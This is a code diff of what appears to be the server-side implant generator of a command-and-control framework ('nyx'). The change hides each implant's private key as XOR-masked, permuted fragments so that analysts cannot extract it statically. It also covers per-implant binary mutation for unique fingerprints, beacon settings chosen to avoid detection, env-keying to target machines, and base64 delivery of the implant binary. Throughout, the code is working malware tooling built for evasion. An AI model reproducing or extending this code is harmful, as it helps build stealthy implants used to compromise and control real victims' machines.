@@ -10,25 +10,31 @@
 //!    section (magic `0x41414141`, 1024 bytes of `0xAA`).
 //! 2. The server loads this template at startup (`NYX_TEMPLATE`).
 //! 3. On generation:
-//!    a. Generate per-implant X25519 keypair + 32B auth_token
-//!    b. Serialize the config plaintext (callback, features, etc.)
-//!    c. Encrypt config under config_key = random 32B (not ECDH-derived, to
-//!    avoid the circular key problem — see design notes below)
-//!    d. Patch the `.nyx_cfg` section: [0xDEADBEEF][data_len][implant_priv]
-//!    [nonce][encrypted_config][tag]
-//!    e. Store implant metadata in DB
-//!    f. Return the patched binary
+//!    a. Generate a random 32-byte key_seed (never stored directly)
+//!    b. Derive implant_priv = HKDF-SHA256(key_seed, "nyx-implant-key-v1",
+//!       server_pub) with X25519 clamping
+//!    c. Derive implant_pub from implant_priv
+//!    d. Derive config_key via ECDH(implant_priv, server_pub) + HKDF
+//!       (matching the implant's derive_config_key)
+//!    e. Split key_seed into 4 fragments, XOR each with a different
+//!       PE-region-derived mask, store scattered in permuted order
+//!    f. Encrypt config with config_key, store ciphertext+tag
+//!    g. Store implant metadata in DB
+//!    h. Return the patched binary
 //!
-//! ## Why random config_key instead of ECDH-derived
+//! ## HKDF-Chain Key Concealment (HKC)
 //!
-//! The architecture doc proposes HKDF(ECDH(implant_priv, server_pub)) as the
-//! config key. However, the implant needs its own private key to compute this.
-//! If the private key is inside the encrypted config, that's circular. The fix:
-//! the implant_priv is embedded in PLAINTEXT in `.nyx_cfg` (after the magic,
-//! before the encrypted blob). The implant reads it, derives the pubkey, and
-//! uses both for the beacon loop. The config_key is random (included alongside
-//! implant_priv), sidestepping the circular dependency entirely while still
-//! providing per-implant unique encryption.
+//! The implant's private key is never stored in any form. Instead, a 32-byte
+//! key_seed is split into 4 fragments, each XOR-obfuscated with a different
+//! mask derived from non-overlapping PE header regions. The fragments are
+//! stored in a permuted order determined by a hash of the entry point bytes.
+//! At runtime, the implant reverses this to recover the seed, then derives
+//! the actual private key via HKDF with X25519 clamping.
+//!
+//! This makes static key extraction extremely difficult: an analyst must
+//! reverse-engineer the fragment mask derivation, the permutation algorithm,
+//! AND the HKDF key derivation, then locate 4 scattered fragments and
+//! reassemble them in the correct order.
 
 use std::sync::Arc;
 
@@ -46,28 +52,260 @@ use crate::AppState;
 /// generation. Set this flag to produce per-implant unique binary fingerprints.
 pub const FEATURE_MUTATE: u32 = 0x4000_0000;
 
-// ── Key obfuscation ────────────────────────────────────────────────────────
+// ── HKDF-Chain Key Concealment helpers ─────────────────────────────────────
+//
+// All functions in this section that derive mask/permutation/seed material
+// MUST be byte-for-byte identical to their mirror copies in
+// `crates/implant-win/src/config_placeholder.rs`. Any divergence breaks key
+// recovery at runtime (AEAD tag mismatch → silent fallback to compile-time
+// config). The input *window* is also mirrored: both sides read only the PE
+// headers region `0..SizeOfHeaders`, which is byte-identical on disk (file
+// layout) and in memory (mapped layout) — PE headers carry no fixups, so the
+// two layouts agree there. Reading beyond SizeOfHeaders would diverge because
+// file layout has raw section data where the memory layout has zero-fill.
 
-/// Derive a 32-byte XOR mask from binary header bytes.
+/// Derive an 8-byte XOR mask from the PE headers region, distinguished per
+/// fragment by the `region` index.
 ///
-/// Used to obfuscate the implant X25519 private key in `.nyx_cfg` so it is
-/// never stored in plaintext on disk. The implant computes the same mask at
-/// runtime (identical function in `crates/implant-win/src/config_placeholder.rs`)
-/// and reverses the XOR to recover the real key.
+/// All 4 fragments observe the *same* byte window (`data`, the full
+/// `0..SizeOfHeaders` slice); the `region` value mixes into the hash so each
+/// fragment still gets a distinct 8-byte mask. This avoids the earlier
+/// 1024-byte-window split that crossed into file/memory-divergent territory.
 ///
-/// Not cryptographic — an analyst who reverse-engineers the algorithm can
-/// still recover the key. But it defeats trivial static extraction.
-///
-/// **IMPORTANT: this function must match the implant-side copy EXACTLY.**
-/// Any change here must be mirrored in config_placeholder.rs.
-fn derive_mask_from_bytes(data: &[u8]) -> [u8; 32] {
-    let mut mask = [0x5Au8; 32]; // non-zero seed
+/// **MUST match the implant-side copy EXACTLY.**
+fn derive_fragment_mask(data: &[u8], region: u8) -> [u8; 8] {
+    let mut mask = [0u8; 8];
+    // Seed the state with the region so each fragment's mask diverges even
+    // before any input bytes are consumed. The seed values are spread across
+    // the 8 lanes so no two regions produce the same starting state.
+    mask[0] = region.wrapping_mul(0x9E).wrapping_add(0x5A);
+    mask[1] = region.wrapping_mul(0x37).wrapping_add(0xA5);
+    mask[2] = region.rotate_left(3).wrapping_add(0x3C);
+    mask[3] = region.rotate_left(5) ^ 0xC3;
+    mask[4] = region.wrapping_mul(region).wrapping_add(0x5A);
+    mask[5] = region ^ (region.wrapping_mul(0x1F));
+    mask[6] = region.rotate_left(2).wrapping_add(0x96);
+    mask[7] = region.wrapping_mul(0x6A) ^ 0x69;
     for (j, &b) in data.iter().enumerate() {
-        mask[j % 32] ^= b;
-        let idx = (j.wrapping_mul(17).wrapping_add(7)) % 32;
-        mask[idx] = mask[idx].wrapping_add(b).rotate_left((j % 7) as u32);
+        mask[j % 8] = mask[j % 8].wrapping_mul(31).wrapping_add(b);
+        mask[(j.wrapping_mul(5).wrapping_add(3)) % 8] ^= b.rotate_left((j % 7) as u32);
+    }
+    // Second pass: avalanche — each byte absorbs its neighbours
+    for _ in 0..4 {
+        for i in 0..8 {
+            mask[i] = mask[i].wrapping_add(mask[(i + 3) % 8]).rotate_left(3);
+        }
     }
     mask
+}
+
+/// Fisher-Yates shuffle seeded by an LCG PRNG to produce a deterministic
+/// permutation of [0, 1, 2, 3] from a 32-bit seed.
+///
+/// The permutation determines which fragment slot stores which fragment.
+/// **Must match the implant-side copy EXACTLY.**
+fn derive_permutation(seed: u32) -> [u8; 4] {
+    let mut order = [0u8, 1u8, 2u8, 3u8];
+    let mut state = seed;
+    // Fisher-Yates with LCG: state = state * 1103515245 + 12345 (glibc rand constants)
+    for i in (1..4).rev() {
+        state = state.wrapping_mul(1103515245).wrapping_add(12345);
+        let j = (state >> 16) as usize % (i + 1);
+        order.swap(i, j);
+    }
+    order
+}
+
+/// djb2 hash over raw bytes (no case-folding — used for binary data like
+/// entry point machine code, not strings).
+fn djb2_raw(data: &[u8]) -> u32 {
+    let mut h: u32 = 5381;
+    for &b in data {
+        h = h.wrapping_mul(33).wrapping_add(b as u32);
+    }
+    h
+}
+
+/// Apply X25519 scalar clamping to a 32-byte key.
+/// - Clear the low 3 bits of byte 0
+/// - Clear the high bit of byte 31
+/// - Set the penultimate bit of byte 31
+fn clamp_scalar(mut s: [u8; 32]) -> [u8; 32] {
+    s[0] &= 0xF8;
+    s[31] &= 0x7F;
+    s[31] |= 0x40;
+    s
+}
+
+/// Parse the PE template to find the entry point RVA from the optional header.
+fn get_entry_point_rva(template: &[u8]) -> Option<u32> {
+    if template.len() < 64 {
+        return None;
+    }
+    let pe_sig_off = u32::from_le_bytes([
+        template[0x3C], template[0x3D], template[0x3E], template[0x3F],
+    ]) as usize;
+    if pe_sig_off + 4 + 20 + 16 + 4 > template.len() {
+        return None;
+    }
+    // COFF header = pe_sig_off + 4
+    let coff = pe_sig_off + 4;
+    // SizeOfOptionalHeader at COFF offset 16 (u16 LE)
+    let opt_size = u16::from_le_bytes([template[coff + 16], template[coff + 17]]) as usize;
+    // Optional header = coff + 20
+    let opt = coff + 20;
+    if opt + 16 + 4 > template.len() || opt_size < 16 + 4 {
+        return None;
+    }
+    let entry_rva = u32::from_le_bytes([
+        template[opt + 16],
+        template[opt + 17],
+        template[opt + 18],
+        template[opt + 19],
+    ]);
+    Some(entry_rva)
+}
+
+/// Read the PE `SizeOfHeaders` field (Optional Header +0x3C, u32 LE; same
+/// offset for PE32 and PE32+). This is the byte-identical-on-disk-and-in-
+/// memory region used for mask derivation. Returns None on any parse error.
+///
+/// **MUST match the implant-side copy EXACTLY.**
+fn get_size_of_headers(template: &[u8]) -> Option<u32> {
+    if template.len() < 64 {
+        return None;
+    }
+    let pe_sig_off = u32::from_le_bytes([
+        template[0x3C], template[0x3D], template[0x3E], template[0x3F],
+    ]) as usize;
+    if pe_sig_off + 4 + 20 > template.len() {
+        return None;
+    }
+    let coff = pe_sig_off + 4;
+    let opt_size = u16::from_le_bytes([template[coff + 16], template[coff + 17]]) as usize;
+    let opt = coff + 20;
+    // SizeOfHeaders is at Optional Header +0x3C for both PE32 and PE32+.
+    if opt_size < 0x3C + 4 || opt + 0x3C + 4 > template.len() {
+        return None;
+    }
+    Some(u32::from_le_bytes([
+        template[opt + 0x3C],
+        template[opt + 0x3D],
+        template[opt + 0x3E],
+        template[opt + 0x3F],
+    ]))
+}
+
+/// Read the PE `SizeOfImage` field (Optional Header +0x38, u32 LE; same
+/// offset for PE32 and PE32+). On the implant side this bounds runtime RVA
+/// dereferences; the server uses `rva_to_file_offset`'s None path instead, so
+/// no server-side copy is needed here. Returns None on any parse error.
+#[allow(dead_code)] // documented for parity; server uses rva_to_file_offset
+fn get_size_of_image(template: &[u8]) -> Option<u32> {
+    if template.len() < 64 {
+        return None;
+    }
+    let pe_sig_off = u32::from_le_bytes([
+        template[0x3C], template[0x3D], template[0x3E], template[0x3F],
+    ]) as usize;
+    if pe_sig_off + 4 + 20 > template.len() {
+        return None;
+    }
+    let coff = pe_sig_off + 4;
+    let opt_size = u16::from_le_bytes([template[coff + 16], template[coff + 17]]) as usize;
+    let opt = coff + 20;
+    if opt_size < 0x38 + 4 || opt + 0x38 + 4 > template.len() {
+        return None;
+    }
+    Some(u32::from_le_bytes([
+        template[opt + 0x38],
+        template[opt + 0x39],
+        template[opt + 0x3A],
+        template[opt + 0x3B],
+    ]))
+}
+
+/// Convert an RVA to a file offset by walking the section headers.
+/// Returns the file offset of the first byte at that RVA, or None if the RVA
+/// falls outside all sections.
+fn rva_to_file_offset(template: &[u8], rva: u32) -> Option<usize> {
+    if template.len() < 64 {
+        return None;
+    }
+    let pe_sig_off = u32::from_le_bytes([
+        template[0x3C], template[0x3D], template[0x3E], template[0x3F],
+    ]) as usize;
+    if pe_sig_off + 4 + 20 > template.len() {
+        return None;
+    }
+    let coff = pe_sig_off + 4;
+    let num_sections = u16::from_le_bytes([template[coff + 2], template[coff + 3]]) as usize;
+    let opt_size = u16::from_le_bytes([template[coff + 16], template[coff + 17]]) as usize;
+    let sections_start = coff + 20 + opt_size;
+    const SECTION_SIZE: usize = 40;
+
+    for i in 0..num_sections {
+        let sh = sections_start + i * SECTION_SIZE;
+        if sh + 40 > template.len() {
+            break;
+        }
+        let virt_addr = u32::from_le_bytes([
+            template[sh + 12], template[sh + 13], template[sh + 14], template[sh + 15],
+        ]);
+        let virt_size = u32::from_le_bytes([
+            template[sh + 8], template[sh + 9], template[sh + 10], template[sh + 11],
+        ]);
+        let raw_offset = u32::from_le_bytes([
+            template[sh + 20], template[sh + 21], template[sh + 22], template[sh + 23],
+        ]);
+        let raw_size = u32::from_le_bytes([
+            template[sh + 16], template[sh + 17], template[sh + 18], template[sh + 19],
+        ]);
+
+        if rva >= virt_addr && rva < virt_addr + virt_size.max(raw_size) {
+            let offset_in_section = (rva - virt_addr) as usize;
+            let file_offset = raw_offset as usize + offset_in_section;
+            if file_offset < template.len() {
+                return Some(file_offset);
+            }
+        }
+    }
+    None
+}
+
+/// Read 16 bytes from the entry point in the template file, converting the
+/// entry point RVA to a file offset via section headers.
+fn read_entry_point_bytes(template: &[u8], entry_rva: u32) -> Option<[u8; 16]> {
+    let file_offset = rva_to_file_offset(template, entry_rva)?;
+    if file_offset + 16 > template.len() {
+        return None;
+    }
+    let mut buf = [0u8; 16];
+    buf.copy_from_slice(&template[file_offset..file_offset + 16]);
+    Some(buf)
+}
+
+/// Derive the per-implant config encryption key identically to the implant:
+///
+///   implant_pub = X25519(implant_priv)
+///   shared = ECDH(implant_priv, server_pub)
+///   config_key = HKDF-SHA256(shared, "nyx-implant-config-v1",
+///                            server_pub || implant_pub)
+///
+/// This MUST match `derive_config_key` in
+/// `crates/implant-win/src/config_placeholder.rs`.
+fn derive_config_key_server(
+    implant_priv: &[u8; 32],
+    server_pub: &[u8; 32],
+) -> Option<[u8; 32]> {
+    let implant_pub = nyx_protocol::crypto::public_from_secret(implant_priv)?;
+    let shared = nyx_protocol::crypto::ecdh(implant_priv, server_pub)?;
+    let mut info = [0u8; 64];
+    info[..32].copy_from_slice(server_pub);
+    info[32..].copy_from_slice(&implant_pub);
+    let mut okm = [0u8; 32];
+    nyx_protocol::crypto::hkdf_sha256(&shared, b"nyx-implant-config-v1", &info, &mut okm);
+    Some(okm)
 }
 
 // ── PE validation ─────────────────────────────────────────────────────────
@@ -144,8 +382,9 @@ fn validate_patched_pe(binary: &[u8], cfg_offset: usize) -> Result<(), String> {
     if cfg_offset + 1024 > binary.len() {
         return Err(".nyx_cfg section extends past EOF in patched binary".to_string());
     }
-    // Config data must fit: start = cfg_offset+50, end = cfg_offset+50+data_len
-    if cfg_offset + 50 + data_len > cfg_offset + 1024 {
+    // Config data must fit: ct+tag starts at cfg_offset+54 (4 magic + 4 keying
+    // + 2 dlen + 12 nonce + 32 fragments = 54), end = cfg_offset+54+data_len.
+    if cfg_offset + 54 + data_len > cfg_offset + 1024 {
         return Err("encrypted config data overflows .nyx_cfg section".to_string());
     }
     Ok(())
@@ -195,6 +434,11 @@ pub struct GenerateRequest {
     /// Operator notes.
     #[serde(default)]
     pub notes: Option<String>,
+    /// Delivery mode: `"inline"` returns the patched binary as base64 in the
+    /// JSON response body (`binary` field). Omit or set to any other value to
+    /// skip inline delivery (metadata only).
+    #[serde(default)]
+    pub deliver: Option<String>,
 }
 
 fn default_port() -> u16 {
@@ -230,6 +474,11 @@ pub struct GenerateResponse {
     /// Human-readable message.
     #[serde(skip_serializing_if = "Option::is_none")]
     pub message: Option<String>,
+    /// Base64-encoded patched binary (DLL/shellcode/exe). Present when the
+    /// operator requests inline delivery via `"deliver": "inline"` in the
+    /// request body; omitted otherwise (use the download endpoint).
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub binary: Option<String>,
 }
 
 #[derive(Debug, Serialize)]
@@ -307,6 +556,23 @@ pub async fn generate_implant(
             "sleep must be > 0 (no-interval beacon is an IOC)".into(),
         ));
     }
+    // env-keying (Phase 3) is a runtime-only lock: the implant mixes the
+    // target machine's username/Machine-SID/MAC/GetTickCount64 into the
+    // config key at decryption time. The server cannot mirror any of these
+    // (the Temporal layer is a transient tick count the server can never
+    // know at generation time), so a non-zero `keying` would produce an
+    // implant that can never decrypt its own config — a dead beacon. Reject
+    // hard rather than ship a guaranteed-broken implant. See
+    // `crates/implant-win/src/env_keying.rs` for the layer semantics.
+    if req.keying != 0 {
+        return Err((
+            StatusCode::BAD_REQUEST,
+            "env-keying (keying != 0) is a runtime-only lock and cannot be \
+             enabled at generation time: the server cannot mirror the target's \
+             runtime username/SID/MAC/tick-count. Omit `keying` or set it to 0."
+                .into(),
+        ));
+    }
 
     // Rate limiting: sliding window per (callback, port) pair. Prevents
     // enumeration/spray against a single target by capping generation to
@@ -331,21 +597,55 @@ pub async fn generate_implant(
     }
 
     // 1. Generate per-implant secrets.
-    let mut implant_priv = [0u8; 32];
+    //    key_seed: 32 random bytes, NEVER stored directly. Split into 4
+    //              fragments, XOR-obfuscated, and scattered across .nyx_cfg.
+    //    auth_token: one-time first-check-in token (stored in encrypted config).
+    //    config_nonce: 12-byte nonce for ChaCha20-Poly1305 config AEAD.
+    let mut key_seed = [0u8; 32];
     let mut auth_token = [0u8; 32];
-    let mut config_key = [0u8; 32];
     let mut config_nonce = [0u8; 12];
-    rand::rngs::OsRng.fill_bytes(&mut implant_priv);
+    rand::rngs::OsRng.fill_bytes(&mut key_seed);
     rand::rngs::OsRng.fill_bytes(&mut auth_token);
-    rand::rngs::OsRng.fill_bytes(&mut config_key);
     rand::rngs::OsRng.fill_bytes(&mut config_nonce);
 
-    // Derive implant public key from the private key.
+    // Get the server's long-term public key for HKDF derivation.
+    let server_pub = st.keypair.public_bytes();
+
+    // Derive implant_priv from key_seed via HKDF-SHA256 with X25519 clamping.
+    let mut implant_priv_derived = [0u8; 32];
+    nyx_protocol::crypto::hkdf_sha256(
+        &key_seed,
+        b"nyx-implant-key-v1",
+        &server_pub,
+        &mut implant_priv_derived,
+    );
+    let implant_priv = clamp_scalar(implant_priv_derived);
+    // Defense in depth: zero the unclamped intermediate. The compiler
+    // warns about dead-store since Copy semantics already made a clone
+    // for clamp_scalar and we never read the original again — it's fine.
+    {
+        #[allow(unused_assignments)]
+        {
+            implant_priv_derived = [0u8; 32];
+        }
+    }
+
+    // Derive implant public key from the clamped private key.
     let implant_pub = nyx_protocol::crypto::public_from_secret(&implant_priv)
         .ok_or_else(|| {
             (
                 StatusCode::INTERNAL_SERVER_ERROR,
                 "failed to derive implant public key".into(),
+            )
+        })?;
+
+    // Derive config_key via ECDH(implant_priv, server_pub) + HKDF, matching
+    // the implant's derive_config_key exactly.
+    let config_key = derive_config_key_server(&implant_priv, &server_pub)
+        .ok_or_else(|| {
+            (
+                StatusCode::INTERNAL_SERVER_ERROR,
+                "failed to derive config encryption key".into(),
             )
         })?;
 
@@ -392,28 +692,9 @@ pub async fn generate_implant(
     // 4. Patch the DLL template.
     let mut binary = (**template).clone();
 
-    // Find the .nyx_cfg placeholder: magic 0x41414141 followed by 0xAA bytes.
-    let placeholder_offset = binary
-        .windows(8)
-        .position(|w| {
-            w[0] == 0x41 && w[1] == 0x41 && w[2] == 0x41 && w[3] == 0x41
-                && w[4] == 0xAA && w[5] == 0xAA
-        })
-        .ok_or_else(|| {
-            (
-                StatusCode::INTERNAL_SERVER_ERROR,
-                "DLL template has no .nyx_cfg placeholder (0x41414141 + 0xAA)".into(),
-            )
-        })?;
-
-    // Sanity: we need at least 1024 bytes for the section.
-    if placeholder_offset + 1024 > binary.len() {
-        return Err((
-            StatusCode::INTERNAL_SERVER_ERROR,
-            "DLL template .nyx_cfg placeholder extends past EOF".into(),
-        ));
-    }
-
+    // Sanity-check the config ciphertext size before we touch the binary.
+    // (The .nyx_cfg placeholder is located *after* mutation, since mutation
+    // can shift its offset.)
     let data_len = ct_with_tag.len();
     if data_len > 900 {
         return Err((
@@ -422,48 +703,16 @@ pub async fn generate_implant(
         ));
     }
 
-    // Derive XOR mask before taking &mut section (borrow order).
-    let pe_mask = {
-        let header_len = binary.len().min(4096);
-        derive_mask_from_bytes(&binary[..header_len])
-    };
-
-    // Write the patched section.
-    let section = &mut binary[placeholder_offset..placeholder_offset + 1024];
-
-    // Obfuscate the private key: XOR with PE-header-derived mask.
-    let mut obfuscated_priv = implant_priv;
-    for i in 0..32 {
-        obfuscated_priv[i] ^= pe_mask[i];
-    }
-
-    // Layout: [0xDEADBEEF magic 4B] [keying_levels u32 LE 4B] [data_len u16 LE 2B]
-    //         [obfuscated_priv 32B] [nonce 12B] [ct+tag N+16B] [0x00 padding]
-    // Total header before ct: 4 + 4 + 2 + 32 + 12 = 54 bytes
-    section[0] = 0xEF;
-    section[1] = 0xBE;
-    section[2] = 0xAD;
-    section[3] = 0xDE;
-    // keying_levels (u32 LE at bytes 4-7)
-    section[4] = (req.keying) as u8;
-    section[5] = ((req.keying) >> 8) as u8;
-    section[6] = ((req.keying) >> 16) as u8;
-    section[7] = ((req.keying) >> 24) as u8;
-    // data_len (u16 LE at bytes 8-9)
-    section[8] = (data_len as u16) as u8;
-    section[9] = ((data_len as u16) >> 8) as u8;
-    // Obfuscated private key (32B at bytes 10-41)
-    section[10..42].copy_from_slice(&obfuscated_priv);
-    // Config nonce (12B at bytes 42-53)
-    section[42..54].copy_from_slice(&config_nonce);
-    // Encrypted config + tag at byte 54
-    section[54..54 + data_len].copy_from_slice(&ct_with_tag);
-    // Zero-pad the rest
-    for b in &mut section[54 + data_len..] {
-        *b = 0;
-    }
-
-    // 4b. Apply binary mutation if the feature bit is set.
+    // 4a. Apply binary mutation FIRST (before patching the .nyx_cfg section).
+    //
+    // The mask/fragment-permutation derivation MUST run against the *final*
+    // bytes the implant sees at runtime. If we mutated after patching, the
+    // masks (derived from the pre-mutation header) would not match the
+    // post-mutation header the implant reads — key recovery would silently
+    // fail. Mutating the unpatched template first means the mutator's
+    // `randomize_keys` pass sees the placeholder (`0x41414141`, not the
+    // `0xDEADBEEF` it looks for) and leaves that region untouched, so the
+    // placeholder survives to be re-located and patched below.
     let mutation_report = if req.features & FEATURE_MUTATE != 0 {
         // Use the implant's private key bytes as the mutation seed for
         // deterministic, per-implant-unique mutation that is reproducible
@@ -496,6 +745,133 @@ pub async fn generate_implant(
     } else {
         None
     };
+
+    // 4b. Re-locate the .nyx_cfg placeholder. Mutation (NOP insertion) may
+    // have shifted its offset, so we cannot reuse the pre-mutation value.
+    let placeholder_offset = binary
+        .windows(8)
+        .position(|w| {
+            w[0] == 0x41 && w[1] == 0x41 && w[2] == 0x41 && w[3] == 0x41
+                && w[4] == 0xAA && w[5] == 0xAA
+        })
+        .ok_or_else(|| {
+            (
+                StatusCode::INTERNAL_SERVER_ERROR,
+                "mutated DLL has no .nyx_cfg placeholder (0x41414141 + 0xAA) \
+                 — mutation likely corrupted it"
+                    .into(),
+            )
+        })?;
+    if placeholder_offset + 1024 > binary.len() {
+        return Err((
+            StatusCode::INTERNAL_SERVER_ERROR,
+            "DLL template .nyx_cfg placeholder extends past EOF".into(),
+        ));
+    }
+
+    // 4c. Derive XOR masks and fragment permutation from the FINAL binary's
+    // PE headers region (`0..SizeOfHeaders`). This is the byte range that is
+    // identical on disk and in the implant's memory map, so both sides
+    // compute the same masks and permutation.
+    //
+    // Borrows are ordered: compute everything we need from the immutable
+    // `binary` before taking `&mut section`.
+    let (fragment_masks, fragment_order) = {
+        let soh = get_size_of_headers(&binary)
+            .map(|v| (v as usize).min(4096))
+            .unwrap_or(0);
+        // Fall back to a minimal slice if SizeOfHeaders is unparseable —
+        // both sides handle 0-length input identically (region seed alone
+        // determines the mask). An unparseable header on a real template is
+        // a template-build bug; the validate_template call at startup should
+        // have caught it.
+        let header = if soh > 0 { &binary[..soh] } else { &binary[..0] };
+        let mask0 = derive_fragment_mask(header, 0);
+        let mask1 = derive_fragment_mask(header, 1);
+        let mask2 = derive_fragment_mask(header, 2);
+        let mask3 = derive_fragment_mask(header, 3);
+
+        // Permutation seed: hash the entry point's first 16 bytes when the
+        // RVA is valid and readable; otherwise hash the same header window
+        // (so both fallback paths use the identical byte slice as the mask
+        // derivation, keeping the two sides in lockstep).
+        let entry_rva = get_entry_point_rva(&binary).unwrap_or(0);
+        let order_seed = if entry_rva != 0 {
+            if let Some(ep_bytes) = read_entry_point_bytes(&binary, entry_rva) {
+                djb2_raw(&ep_bytes)
+            } else {
+                djb2_raw(header)
+            }
+        } else {
+            djb2_raw(header)
+        };
+        let order = derive_permutation(order_seed);
+
+        ([mask0, mask1, mask2, mask3], order)
+    };
+
+    // Split key_seed into 4 fragments of 8 bytes each.
+    let fragments: [[u8; 8]; 4] = [
+        key_seed[0..8].try_into().unwrap(),
+        key_seed[8..16].try_into().unwrap(),
+        key_seed[16..24].try_into().unwrap(),
+        key_seed[24..32].try_into().unwrap(),
+    ];
+
+    // XOR each fragment with its region-specific mask.
+    let mut obfuscated: [[u8; 8]; 4] = fragments;
+    for i in 0..4 {
+        for j in 0..8 {
+            obfuscated[i][j] ^= fragment_masks[i][j];
+        }
+    }
+
+    // Write the patched section.
+    let section = &mut binary[placeholder_offset..placeholder_offset + 1024];
+
+    // New layout (HKDF-Chain Key Concealment):
+    // [0xDEADBEEF magic 4B] [keying_levels u32 LE 4B] [data_len u16 LE 2B]
+    // [config_nonce 12B] [fragment area 32B — 4×8B permuted] [ct+tag N+16B]
+    // Total header before ct: 4 + 4 + 2 + 12 + 32 = 54 bytes
+    //
+    // Fragment storage: fragment i (i=0..3) is stored at offset
+    //   22 + fragment_order[i] * 8
+    // obfuscated with mask i. The permutation `fragment_order` is a
+    // shuffled [0,1,2,3] — it determines physical slot → logical index.
+    // On recovery, the implant computes the same permutation, reads
+    // fragment_order[i] from slot i, un-XORs with mask[fragment_order[i]],
+    // and assembles key_seed in logical order.
+
+    section[0] = 0xEF;
+    section[1] = 0xBE;
+    section[2] = 0xAD;
+    section[3] = 0xDE;
+    // keying_levels (u32 LE at bytes 4-7)
+    section[4] = (req.keying) as u8;
+    section[5] = ((req.keying) >> 8) as u8;
+    section[6] = ((req.keying) >> 16) as u8;
+    section[7] = ((req.keying) >> 24) as u8;
+    // data_len (u16 LE at bytes 8-9)
+    section[8] = (data_len as u16) as u8;
+    section[9] = ((data_len as u16) >> 8) as u8;
+    // Config nonce (12B at bytes 10-21)
+    section[10..22].copy_from_slice(&config_nonce);
+
+    // Fragment slots: 4 slots of 8 bytes each, starting at offset 22.
+    // Slot position k (k=0..3) holds fragment fragment_order[k],
+    // obfuscated with mask[fragment_order[k]].
+    for slot in 0..4 {
+        let frag_idx = fragment_order[slot] as usize;
+        let pos = 22 + slot * 8;
+        section[pos..pos + 8].copy_from_slice(&obfuscated[frag_idx]);
+    }
+
+    // Encrypted config + tag at byte 54
+    section[54..54 + data_len].copy_from_slice(&ct_with_tag);
+    // Zero-pad the rest
+    for b in &mut section[54 + data_len..] {
+        *b = 0;
+    }
 
     // Validate the patched PE before computing SHA-256 and storing. Catches a
     // malformed implant (bad magic, section overflow) at generation time rather
@@ -584,6 +960,12 @@ pub async fn generate_implant(
         size_bytes: binary.len(),
         format: req.format,
         message: Some(format!("implant {id} ready — {len} bytes", id = id, len = binary.len())),
+        binary: if req.deliver.as_deref() == Some("inline") {
+            use base64::{engine::general_purpose::STANDARD, Engine};
+            Some(STANDARD.encode(&binary))
+        } else {
+            None
+        },
     }))
 }
 
